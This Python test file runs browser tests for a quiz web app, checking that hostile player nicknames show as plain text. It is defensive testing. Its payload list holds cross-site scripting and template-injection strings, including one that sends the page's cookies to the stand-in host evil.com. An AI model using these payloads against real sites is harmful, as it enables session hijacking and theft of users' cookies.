"""Integration tests: verify malicious nicknames render as plain text in the browser."""

import socket
import threading

import pytest
import uvicorn
from playwright.sync_api import sync_playwright

from bayesian_quiz.app import app
from bayesian_quiz.state import games, get_or_create_game


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture(scope="module")
def server():
    port = _free_port()
    config = uvicorn.Config(app, host="127.0.0.1", port=port, log_level="error")
    srv = uvicorn.Server(config)
    thread = threading.Thread(target=srv.run, daemon=True)
    thread.start()
    while not srv.started:
        pass
    yield f"http://127.0.0.1:{port}"
    srv.should_exit = True
    thread.join(timeout=5)


@pytest.fixture(autouse=True)
def _reset_game():
    """Reset game state before each test."""
    games.clear()
    get_or_create_game("sample")


XSS_NICKNAMES = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<div onmouseover="alert(1)">hover</div>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">',
    "{{7*7}}",
    "${7*7}",
    "{% raw %}{% endraw %}",
    '<img src="x" onerror="document.location=\'http://evil.com/?\'+document.cookie">',
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    '\x00<script>alert(1)</script>',
    'Alice\u200b<script>alert(1)</script>',
]


@pytest.fixture(scope="module")
def browser_ctx():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        yield context
        context.close()
        browser.close()


def _register(page, nickname: str):
    """Fill and submit the registration form, return the page after swap."""
    input_el = page.locator('input[name="nickname"]')
    input_el.fill(nickname)
    page.locator('button[type="submit"]').click()
    page.wait_for_selector("#main-content")
    page.wait_for_timeout(300)


class TestXSSNicknames:
    @pytest.mark.parametrize("nickname", XSS_NICKNAMES, ids=range(len(XSS_NICKNAMES)))
    def test_nickname_renders_as_text(self, server, browser_ctx, nickname):
        """Nickname must appear as visible text, never as live HTML/script."""
        page = browser_ctx.new_page()
        dialog_fired = []
        page.on("dialog", lambda d: (dialog_fired.append(d.message), d.dismiss()))

        try:
            page.goto(f"{server}/play?sample")
            _register(page, nickname)

            assert not dialog_fired, f"Alert dialog triggered by nickname: {dialog_fired}"

            # Verify no injected elements (img, iframe, svg) were created by the nickname
            main = page.locator("#main-content")
            injected = main.locator("img[onerror], iframe, svg[onload], marquee, details[ontoggle]")
            assert injected.count() == 0, "Injected HTML elements found in DOM"

        finally:
            page.close()

    def test_nickname_visible_on_projector(self, server, browser_ctx):
        """Malicious nickname shows as plain text in projector word cloud."""
        page = browser_ctx.new_page()
        dialog_fired = []
        page.on("dialog", lambda d: (dialog_fired.append(d.message), d.dismiss()))

        try:
            reg_page = browser_ctx.new_page()
            reg_page.goto(f"{server}/play?sample")
            _register(reg_page, '<img src=x onerror=alert("pwned")>')
            reg_page.close()

            page.goto(f"{server}/projector?sample")
            page.wait_for_timeout(500)

            assert not dialog_fired, f"Alert triggered on projector: {dialog_fired}"

            word_cloud = page.text_content("body")
            assert "<img" in word_cloud or "img" in word_cloud.lower() or "onerror" in word_cloud

        finally:
            page.close()

    def test_no_script_elements_injected(self, server, browser_ctx):
        """No extra <script> elements beyond the app's own scripts."""
        page = browser_ctx.new_page()
        try:
            reg_page = browser_ctx.new_page()
            reg_page.goto(f"{server}/play?sample")
            _register(reg_page, '<script>document.title="hacked"</script>')
            reg_page.close()

            page.goto(f"{server}/projector?sample")
            page.wait_for_timeout(500)

            assert page.title() != "hacked"

            scripts = page.locator("script").all()
            for s in scripts:
                text = s.text_content()
                assert "hacked" not in text, "Injected script found in DOM"

        finally:
            page.close()

    def test_html_entities_in_nickname_not_decoded(self, server, browser_ctx):
        """Literal &lt; in nickname stays as visible text, not decoded to <."""
        page = browser_ctx.new_page()
        try:
            page.goto(f"{server}/play?sample")
            _register(page, "&lt;b&gt;bold&lt;/b&gt;")

            text = page.text_content("#main-content")
            assert "&lt;b&gt;bold&lt;/b&gt;" in text

        finally:
            page.close()
